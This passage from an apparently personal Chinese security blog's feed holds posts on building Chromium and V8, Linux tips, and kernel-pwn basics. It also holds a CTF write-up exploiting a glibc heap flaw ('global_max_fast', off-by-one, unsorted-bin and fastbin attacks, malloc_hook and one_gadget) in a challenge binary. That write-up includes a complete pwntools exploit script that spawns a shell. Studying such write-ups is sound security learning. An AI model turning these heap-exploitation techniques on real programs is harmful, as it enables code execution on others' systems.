https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">$export PATH=&quot;$PATH:/path/to/depot_tools&quot;</span><br></pre></td></tr></table></figure><p>加入环境变量之后发现，fetch等一些工具根本不能用，必须用绝对路径指定python版本，(<del>我寻思着我python的默认版本也是2.7啊</del>)，指定为2.7版本，然后才能运行</p><h2 id="0x02-下载源码"><a href="#0x02-下载源码" class="headerlink" title="0x02 下载源码"></a>0x02 下载源码</h2><h3 id="0x00-本地下载源码"><a href="#0x00-本地下载源码" class="headerlink" title="0x00 本地下载源码"></a>0x00 本地下载源码</h3><p>下载chrome源码，17个G，git根本支撑不了这么长时间的链接，稳稳当当的 <strong>early eof</strong>，也不知道大佬们怎么下载下来的，尝试几次之后果断放弃</p><h3 id="0x01-在vps上下载"><a href="#0x01-在vps上下载" class="headerlink" title="0x01 在vps上下载"></a>0x01 在vps上下载</h3><p>本地下载不了，vps在国外总可以吧，提名表扬一下vultr德国节点机房下载速度为30M/s,为了保证万无一失，我vps也装的是ubuntu 18.04，与本地环境保持一致，发现配置好depot_tools环境变量，fetch操作就正常了。。。。。</p><p>源码下载的时候，因为源码太大了，17g，会报错 <strong>out of memory</strong> 所以需要扩展swap分区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=/root/myswapfile bs=1M count=20480</span><br><span class="line">ls -l /root/myswapfile</span><br><span class="line">chmod 600 /root/myswapfile</span><br><span class="line">mkswap /root/myswapfile</span><br><span class="line">swapon /root/myswapfile</span><br><span class="line">swapon -s</span><br></pre></td></tr></table></figure></p><p>注意下载完之后重启，然后删除这个文件，20g挺大的<br>参考博客<a href="https://www.300168.com/yunwei/show-3280.html" target="_blank" rel="noopener">https://www.300168.com/yunwei/show-3280.html</a></p><h3 id="0x02-传到本地"><a href="#0x02-传到本地" class="headerlink" title="0x02 传到本地"></a>0x02 传到本地</h3><p>构建完代码31g怎么传到本地是个问题，首先压缩，scp和ftp都不是很好用，最好用的方式是用 <strong>nginx</strong> 搭建一个web服务，用迅雷下载，我基本是10M/s</p><h3 id="0x03-失败"><a href="#0x03-失败" class="headerlink" title="0x03 失败"></a>0x03 失败</h3><p>虽然，能解压到本地，但是编译的时候出错，原因是<strong>~</strong> 目录下没有.vpython这个文件夹。。。几经尝试，准备转战v8，但是v8也是同样的问题</p><h3 id="0x04-换虚拟机"><a href="#0x04-换虚拟机" class="headerlink" title="0x04 换虚拟机"></a>0x04 换虚拟机</h3><p>换个了个16.04的虚拟机成功配置成功。。。。</p>]]></content>
    
    <summary type="html">
    
      这里写一下，我下载v8和chrome源码的一些惨痛经历
    
    </summary>
    
    
    
      <category term="杂记,浏览器" scheme="http://yoursite.com/tags/%E6%9D%82%E8%AE%B0-%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>&#39;杂谈&#39;</title>
    <link href="http://yoursite.com/2019/10/02/%E6%9D%82%E8%B0%88/"/>
    <id>http://yoursite.com/2019/10/02/杂谈/</id>
    <published>2019-10-02T11:49:01.000Z</published>
    <updated>2019-11-07T05:19:29.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-手机的开发者选项，一些好用的功能"><a href="#0x01-手机的开发者选项，一些好用的功能" class="headerlink" title="0x01 手机的开发者选项，一些好用的功能"></a>0x01 手机的开发者选项，一些好用的功能</h1><p>今天闲着无聊，看了一下手机开发者选项，发现一个比较有意思的功能 <strong>最小宽度</strong>，<del>这个可以修改屏幕的宽度</del>，其效果是你调高最小宽度，整个手机屏幕的像素点好像变多的了，表现为图标变小</p><h1 id="0x02-grep-查找文件内容"><a href="#0x02-grep-查找文件内容" class="headerlink" title="0x02 grep 查找文件内容"></a>0x02 grep 查找文件内容</h1><p>grep -r ‘string’ path 再也不用担心找不到函数了。。。。。</p><h1 id="0x03-linux下which和whereis的区别"><a href="#0x03-linux下which和whereis的区别" class="headerlink" title="0x03 linux下which和whereis的区别"></a>0x03 linux下which和whereis的区别</h1><p>which是直接查找我们设置好的 <strong>PATH</strong> 变量路径下查找，而whereis更广泛</p><h1 id="0x04-python关于import的问题"><a href="#0x04-python关于import的问题" class="headerlink" title="0x04 python关于import的问题"></a>0x04 python关于import的问题</h1><p>在b.py里面import a.py是不会调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__=&apos;__main__&apos;:</span><br><span class="line">    ****</span><br></pre></td></tr></table></figure></p><p>的内容的</p><h1 id="0x05-hexo博客折腾"><a href="#0x05-hexo博客折腾" class="headerlink" title="0x05 hexo博客折腾"></a>0x05 hexo博客折腾</h1><p>前天，hexo博客突然不能更新了，github库更新了，可是页面就是不更新，难受的要死，最后删除，.deploy_git文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure><p>解决</p><h1 id="0x06-hexo-gittalk添加评论功能"><a href="#0x06-hexo-gittalk添加评论功能" class="headerlink" title="0x06 hexo gittalk添加评论功能"></a>0x06 hexo gittalk添加评论功能</h1><p>突然想弄一个评论功能，一开始用gitment，发现不行，更新next主题，然后，用的gittalk，配置过程及其心酸，玄学问题，最后在机缘巧合下完成评论功能</p><p><a href="https://blog.csdn.net/qq_35076330/article/details/99968291" target="_blank" rel="noopener">https://blog.csdn.net/qq_35076330/article/details/99968291</a></p><p>看命吧</p>]]></content>
    
    <summary type="html">
    
      这里记录一下，遇到的一些有趣的东西，有时间再研究一下子
    
    </summary>
    
    
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>linux_kernel杂记</title>
    <link href="http://yoursite.com/2019/09/24/2019-09-24-linux-kernel%E6%9D%82%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/09/24/2019-09-24-linux-kernel杂记/</id>
    <published>2019-09-24T06:24:00.000Z</published>
    <updated>2019-09-24T12:42:34.164Z</updated>
    
    <content type="html"><![CDATA[<ul><li>关于操作系统 <strong>实时模式</strong> 和 <strong>保护模式</strong> 的区别<br><strong>实时模式</strong> 是没有虚拟地址这一层的，代码直接加载物理内存上，对内存操作，也是用的物理内存的真实地址<br><strong>保护模式</strong> 是对于应用层的应用来说的，为了更好的应用动态链接机制，系统让每个进程都有4GB的虚拟地址,之后再映射到真实的物理内存上，其映射关系是由当前进程的 <strong>task_struct</strong> 结构体中的 *mm 结构体控制的</li><li>SysRq<br>查看状态 <strong>cat /proc/sys/kernel/sysrq</strong> ,0为关闭，1为开启，<del>我看到的是176，也是关闭，不过改成1就可以开启了，好神奇。。。。</del><br>暂时开启此功能 <strong>sudo echo 1 /proc/sys/kernel/sysrq</strong> ,暂时关闭 <strong>sudo echo 0 /proc/sys/kernel/sysrq</strong><blockquote><p><kernel source="">/Documentation/sysrq.txt: sysrq.txt</kernel></p></blockquote></li></ul><p>可以查看文档</p><ul><li>ubuntu 双机调试感受<br>这种调试方法优势在于你可以完整的调试一个系统，可以借助被调试机gdb和调试的gdb，完整的调试一个程序，但是，我发现调试机gdb下断点之后，被调试机到断点，调试机的gdb只能发指令，不能看反汇编代码。。。。，调试失败，，，，qemu调试的话，主要是文件系统难搭建，连apt都没有</li></ul>]]></content>
    
    <summary type="html">
    
      这里总结一下，我对linux kernel的理解
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>linux kernel pwn初探</title>
    <link href="http://yoursite.com/2019/09/17/linux-kernel-pwn%E5%88%9D%E6%8E%A2/"/>
    <id>http://yoursite.com/2019/09/17/linux-kernel-pwn初探/</id>
    <published>2019-09-17T15:11:02.000Z</published>
    <updated>2019-09-24T06:22:04.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>又被卡住了，主要不知道linux内核运行机制，用户态转化成内核态究竟做了些什么，内核态返回用户态又做了一些怎样的操作，<del>虽然，看了一些博客，说是内核会在一个独立的页，sys call的时候，用户态会挂起，保存各个储存器的值，返回的时候再恢复,感觉很抽象，还是没有调试过</del></p><h1 id="0x00-ctf出题方式"><a href="#0x00-ctf出题方式" class="headerlink" title="0x00 ctf出题方式"></a>0x00 ctf出题方式</h1><p>kernel pwn一般会给个驱动程序，找漏洞来提权</p><h1 id="0x01-linux驱动程序运行机制"><a href="#0x01-linux驱动程序运行机制" class="headerlink" title="0x01 linux驱动程序运行机制"></a>0x01 linux驱动程序运行机制</h1><ul><li>linux驱动运行于linux kernel中</li><li>用户一般可以通过c语言的ioctl()函数进行交互</li><li>用户也可以用write()函数和read()和驱动交互（如果驱动程序实现的话），<del>fd指针是驱动的设备的结构体的指针</del></li><li>驱动如果有全局变量的话，直到驱动程序重启，全局变量才会被重置</li><li>驱动程序是常驻内存的，<del>像一个serivce程序</del></li></ul><h1 id="0x02-常规操作"><a href="#0x02-常规操作" class="headerlink" title="0x02 常规操作"></a>0x02 常规操作</h1><ul><li>右键解压硬盘文件（.img,.cpio）</li><li>根据需要改init的文件</li><li>打包指令 <strong>find . | cpio -o -H newc | gzip &gt; ../core.cpio</strong></li></ul><h1 id="0x03-常见的利用方式"><a href="#0x03-常见的利用方式" class="headerlink" title="0x03 常见的利用方式"></a>0x03 常见的利用方式</h1><h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><p>简单来说就是，你传给驱动程序一个参数，然后你再新建一个线程去改变这个值就有可能造成非预期的程序流，从而绕过一些不可能过的检查</p><h1 id="有一些还不太清楚待补-有点迷-23333"><a href="#有一些还不太清楚待补-有点迷-23333" class="headerlink" title="有一些还不太清楚待补 有点迷 23333"></a>有一些还不太清楚待补 有点迷 23333</h1>]]></content>
    
    <summary type="html">
    
      刚刚接触kernel pwn，记录一下自己的认识
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>global_max_fast利用</title>
    <link href="http://yoursite.com/2019/09/16/global-max-fast%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/09/16/global-max-fast利用/</id>
    <published>2019-09-15T23:53:59.000Z</published>
    <updated>2019-09-16T07:32:19.987Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>global_max_fast就是程序规定堆的最大的fastbin的size，存于libc的bss段，用gdb动态调试的时候可以输入命令 <strong>p/x &amp;global_max_fast</strong><br><img src="/2019/09/16/global-max-fast利用/global-max-fast.png" alt="global_max_fast"><br>下面根据note_five讲解一下利用过程</p><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><h2 id="0x00-checksec"><a href="#0x00-checksec" class="headerlink" title="0x00 checksec"></a>0x00 checksec</h2><p>保护全开没什么好说的<br><img src="/2019/09/16/global-max-fast利用/checksec.png" alt="checksec"></p><h2 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h2><p>漏洞函数是这个函数<br><img src="/2019/09/16/global-max-fast利用/vul-funtion.png" alt="vul_funtion"><br>很容易看到漏洞点是 <strong>off by one</strong> 但malloc的时候size有个限制<br> <img src="/2019/09/16/global-max-fast利用/size.png" alt="size"></p><p> 这样的话，size大于0x8f，意味着fastbin我们都不能用了，最重要的是libc中0x7f就不能再伪造size了</p><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><p> 常规的话：<br> leak libc address</p><p> control malloc_hook or free hook</p><p> 如果不能leak libc address的话，就只能考虑伪造chunk 低字节改了</p><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><p>参考 <strong>ex</strong> 师傅的wp</p><p><a href="http://blog.eonew.cn/" title="http://blog.eonew.cn/" target="_blank" rel="noopener">附上ex师傅的博客</a></p><h3 id="0x00-overlap"><a href="#0x00-overlap" class="headerlink" title="0x00 overlap"></a>0x00 overlap</h3><p>首先学到 <strong>overlap</strong> 新姿势<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">New(<span class="number">0</span>, <span class="number">0x98</span>)</span><br><span class="line">New(<span class="number">1</span>, <span class="number">0x98</span>)</span><br><span class="line">New(<span class="number">2</span>, <span class="number">0x98</span>)</span><br><span class="line">New(<span class="number">3</span>, <span class="number">0x98</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'a'</span> * <span class="number">0x90</span> + p64(<span class="number">0x140</span>) + p8(<span class="number">0xa0</span>))<span class="comment">#修改chunk2的preinuse位让chunk2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>首先malloc 4个chunk，先free 第0个chunk，然后再布置好 <strong>chunk 2的presize=chunk 0的size+chunk 1的size</strong> ，然后把chunk preinuse位置0，之后free chunk 2的过程中就会检查前一个chunk是否处于free状态，如果是就会发生合并，这样的话，就达到了overlap</p><h3 id="0x01-unsortedbin-attack"><a href="#0x01-unsortedbin-attack" class="headerlink" title="0x01 unsortedbin attack"></a>0x01 unsortedbin attack</h3><p>unsortedbin链表是循环链表，当有一个新的chunk插入链表链表的时候，会链表尾插入，从链表取出时，会进行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p><p>如果我们能控制chunk的bk就能向任意address写入unsortedbin链表的表尾的地址</p><p>前一步达到了overlap，bk当然也能控制，然后就是改global_max_fast的值，利用低字节改，爆破一下就可以了</p><h3 id="0x02-fastbin-attack"><a href="#0x02-fastbin-attack" class="headerlink" title="0x02 fastbin attack"></a>0x02 fastbin attack</h3><p>改了global_max_fast，基本上你malloc的chunk都是fastbin，但是有个问题就是你free的bin的怎么出现libc的地址，这个时候就要用到上一步的unsortedbin链表了<br><img src="/2019/09/16/global-max-fast利用/unsortedbin.png" alt="unsortedbin"></p><p>这里可以先free一个精心控制size的chunk，就可以让它正好放在unsortedbin的位置，因为unsortedbin在libc中在fastbin链表的下面，而fastbin插入的时候根据size算表头的位置,这样会溢出fastbin表头位置覆盖到unsortedbin链表,fastbin是单向列表，插入的时候，从表头插入，malloc的时候从表头取，这样fastbin fd指针就会有libc的address</p><h3 id="0x03-leak-libc-address"><a href="#0x03-leak-libc-address" class="headerlink" title="0x03 leak libc address"></a>0x03 leak libc address</h3><p>常规的话就是控制stdout结构体，由于size的限制，好用的0x7f不能用了，但是，std结构体中有0xffffffffffffffff<br><img src="/2019/09/16/global-max-fast利用/fakesize.png" alt="fakesize"></p><p>后面刚好是这个位置+8刚好是0,而我们可以改fastbin chunk的size和bk，malloc到这里</p><h3 id="0x04-control-malloc-hook"><a href="#0x04-control-malloc-hook" class="headerlink" title="0x04 control malloc_hook"></a>0x04 control malloc_hook</h3><p>由于malloc_hook的位置在stdin结构体下面，而stdin结构体也有0xffffffffffffffff的值，所以，就能控制malloc_hook</p><h3 id="one-gadget失效"><a href="#one-gadget失效" class="headerlink" title="one_gadget失效"></a>one_gadget失效</h3><p>由于one_gadget全部失效，但是控制malloc_hook的时候同时也能控制realloc_hook,可以用realloc_hook填入one_gadget，malloc_hook填入realloc函数的地址来调整stack使one_gadget生效</p><h1 id="0x02-完整exp"><a href="#0x02-完整exp" class="headerlink" title="0x02 完整exp"></a>0x02 完整exp</h1><p>建议调试的时候关闭alsr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">import struct</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">salt = os.getenv(&apos;GDB_SALT&apos;) if (os.getenv(&apos;GDB_SALT&apos;)) else &apos;&apos;</span><br><span class="line"></span><br><span class="line">def clear(signum=None, stack=None):</span><br><span class="line">    print(&apos;Strip  all debugging information&apos;)</span><br><span class="line">    os.system(&apos;rm -f /tmp/gdb_symbols&#123;&#125;* /tmp/gdb_pid&#123;&#125;* /tmp/gdb_script&#123;&#125;*&apos;.replace(&apos;&#123;&#125;&apos;, salt))</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]:</span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"># # Create a symbol file for GDB debugging</span><br><span class="line"># try:</span><br><span class="line">#     gdb_symbols = &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">#     &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">#     f = open(&apos;/tmp/gdb_symbols&#123;&#125;.c&apos;.replace(&apos;&#123;&#125;&apos;, salt), &apos;w&apos;)</span><br><span class="line">#     f.write(gdb_symbols)</span><br><span class="line">#     f.close()</span><br><span class="line">#     os.system(&apos;gcc -g -shared /tmp/gdb_symbols&#123;&#125;.c -o /tmp/gdb_symbols&#123;&#125;.so&apos;.replace(&apos;&#123;&#125;&apos;, salt))</span><br><span class="line">#     # os.system(&apos;gcc -g -m32 -shared /tmp/gdb_symbols&#123;&#125;.c -o /tmp/gdb_symbols&#123;&#125;.so&apos;.replace(&apos;&#123;&#125;&apos;, salt))</span><br><span class="line"># except Exception as e:</span><br><span class="line">#     print(e)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line"># context.arch = &apos;i386&apos;</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">execve_file = &apos;./note_five&apos;</span><br><span class="line"># sh = process(execve_file, env=&#123;&apos;LD_PRELOAD&apos;: &apos;/tmp/gdb_symbols&#123;&#125;.so&apos;.replace(&apos;&#123;&#125;&apos;, salt)&#125;)</span><br><span class="line">sh = process(execve_file)</span><br><span class="line">#sh = remote(&apos;112.126.103.195&apos;, 9999)</span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"># libc = ELF(&apos;./libc-2.27.so&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"># Create temporary files for GDB debugging</span><br><span class="line">try:</span><br><span class="line">    gdbscript = &apos;&apos;&apos;</span><br><span class="line">    def pr</span><br><span class="line">        x/5gx $rebase(0x202080)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">    b malloc</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    f = open(&apos;/tmp/gdb_pid&#123;&#125;&apos;.replace(&apos;&#123;&#125;&apos;, salt), &apos;w&apos;)</span><br><span class="line">    f.write(str(proc.pidof(sh)[0]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(&apos;/tmp/gdb_script&#123;&#125;&apos;.replace(&apos;&#123;&#125;&apos;, salt), &apos;w&apos;)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">def New(index, size):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&gt; &apos;, &apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;idx: &apos;, str(index))</span><br><span class="line">    sh.sendlineafter(&apos;size: &apos;, str(size))</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&gt; &apos;, &apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;idx: &apos;, str(index))</span><br><span class="line">    sh.sendafter(&apos;content: &apos;, content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&gt; &apos;, &apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;idx: &apos;, str(index))</span><br><span class="line">def b():</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">New(0, 0x98)</span><br><span class="line">New(1, 0x98)</span><br><span class="line">New(2, 0x98)</span><br><span class="line">New(3, 0x98)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">delete(0)</span><br><span class="line">edit(1, &apos;a&apos; * 0x90 + p64(0x140) + p8(0xa0))</span><br><span class="line">delete(2)</span><br><span class="line">New(0, 0xe8)</span><br><span class="line"></span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p64(0) + p16(0x37f8 - 0x10) + &apos;\n&apos;)</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">delete(4)</span><br><span class="line">b()</span><br><span class="line"></span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p16(0x25cf) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line">b()</span><br><span class="line">edit(0, &apos;b&apos; * 0x41 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + p8(0x88) + &apos;\n&apos;)</span><br><span class="line">result = sh.recvn(8)</span><br><span class="line">libc_addr = u64(result) - libc.symbols[&apos;_IO_2_1_stdin_&apos;]</span><br><span class="line">log.success(&apos;libc_addr: &apos; + hex(libc_addr))</span><br><span class="line">b()</span><br><span class="line">delete(4)</span><br><span class="line">b()</span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&apos;_IO_2_1_stdin_&apos;] + 143) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line">b()</span><br><span class="line">edit(0, &apos;\0&apos; * 0xe1 + p32(0xf1) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">delete(4)</span><br><span class="line">b()</span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&apos;_IO_2_1_stdin_&apos;] + 376) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line">b()</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">edit(0, &apos;\0&apos; * 0xa0 + p64(libc_addr + 0x4526a) + p64(libc_addr + libc.symbols[&apos;realloc&apos;] + 13) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line"># pause()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;cat flag&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure><h1 id="0x3-踩坑"><a href="#0x3-踩坑" class="headerlink" title="0x3 踩坑"></a>0x3 踩坑</h1><ul><li>比赛的时候，由于没有做过改global_max_fast的题目，不知道这么好用，没有注意到0xffffffffffffffff,fastbin的fd也没想到unsortedbin，以为不能leak，就用了FSOP爆破一个半字节，一个小时没出来。。。。。2333 调试过程堪称艰苦</li><li>赛后,没看ex师傅的exp的时候，也尝试自己用global_max_fast free之后crash，不知道怎么回事，之后误删虚拟机exp也没了。。。。有时间再探究一下</li><li>附上自己辛苦写的exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 